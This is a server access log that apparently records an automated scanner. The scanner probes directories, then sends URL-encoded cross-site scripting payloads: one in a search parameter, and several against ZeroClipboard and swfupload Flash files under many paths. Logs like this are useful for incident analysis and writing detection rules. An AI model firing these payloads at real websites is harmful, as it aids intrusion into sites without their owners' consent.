[2018-09-17 16:08:43.581] [INFO] access - GET /
[2018-09-17 16:08:43.798] [INFO] access - GET /data/
[2018-09-17 16:08:46.946] [INFO] access - GET /libs/
[2018-09-17 16:08:47.106] [INFO] access - GET /upload/
[2018-09-17 16:08:48.229] [INFO] access - GET /test/
[2018-09-17 16:08:48.379] [INFO] access - GET /log/
[2018-09-17 16:08:49.521] [INFO] access - GET /conf/
[2018-09-17 16:08:49.671] [INFO] access - GET /image/
[2018-09-17 16:08:52.774] [INFO] access - GET /Appliaction/
[2018-09-17 16:16:56.967] [INFO] access - GET /
[2018-09-17 16:16:57.024] [INFO] access - GET /
[2018-09-17 16:32:19.989] [INFO] access - GET /
[2018-09-17 16:32:20.314] [INFO] access - GET /search?words=test_post_data%3Cscript%3Ewindow.a%3D%3D1%3F1%3Aprompt%28a%3D1%29%3C%2Fscript%3E
[2018-09-17 16:53:44.008] [INFO] access - GET /static/js/ZeroClipboard.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.157] [INFO] access - GET /ZeroClipboard.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.299] [INFO] access - GET /flash/ZeroClipboard.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.438] [INFO] access - GET /js/ZeroClipboard.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.566] [INFO] access - GET /swf/ZeroClipboard.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.742] [INFO] access - GET /swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:44.970] [INFO] access - GET /swfupload/swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:45.143] [INFO] access - GET /upload/swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:45.285] [INFO] access - GET /images/swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:45.451] [INFO] access - GET /static/swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
[2018-09-17 16:53:45.594] [INFO] access - GET /common/swfupload.swf?id=%5C%22))%7Dcatch(e)%7Bconfirm(/XSS./.source);%7D//&width=500&height=500&.swf
